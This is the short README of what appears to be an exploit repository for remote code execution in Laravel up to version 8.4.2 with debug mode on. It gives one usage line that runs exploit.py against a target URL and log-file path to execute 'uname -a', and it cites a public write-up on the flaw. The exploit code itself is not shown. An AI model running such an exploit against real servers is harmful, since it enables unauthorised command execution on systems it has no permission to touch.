# laravel-8.4.2-rce

## Usage

```bash
python3 exploit.py http://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log 'uname -a'
```
![](./resource/exploit.png)

## References
[Laravel <= v8.4.2 debug mode RCE](https://www.ambionics.io/blog/laravel-debug-rce)